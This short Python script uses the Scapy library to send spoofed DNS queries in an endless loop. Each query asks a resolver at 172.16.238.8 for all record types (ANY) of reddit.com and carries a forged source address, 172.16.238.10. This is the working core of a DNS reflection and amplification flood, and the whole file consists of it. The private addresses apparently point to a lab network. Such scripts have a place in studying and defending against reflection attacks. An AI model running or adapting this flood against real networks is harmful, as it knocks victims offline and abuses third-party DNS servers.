from scapy.layers.dns import DNS, DNSQR, dnsqtypes
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

while 1:
    request = (
        IP(src="172.16.238.10", dst="172.16.238.8") /
        UDP(dport=53) /
        DNS(rd=1, qdcount=1, qd=DNSQR(qname="reddit.com", qtype=255))
    )
    print(len(request))
    send(request)
